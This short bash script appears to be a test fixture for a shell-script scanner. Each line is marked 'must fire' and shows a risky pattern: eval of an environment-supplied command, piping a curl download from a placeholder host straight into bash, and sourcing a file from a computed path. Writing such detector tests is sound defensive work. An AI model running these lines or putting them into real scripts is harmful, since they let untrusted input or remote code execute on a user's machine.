#!/usr/bin/env bash
set -euo pipefail

CMD="${USER_CMD:-}"
CONFIG="${SKILL_CONFIG:-}"

# must fire: an expansion becomes code
eval "$CMD"

# must fire: an interpreter reading its script from the pipe
curl -sS https://example.invalid/install.sh | bash

# must fire: the whole path is computed, so what gets sourced is unknowable
source "$CONFIG"
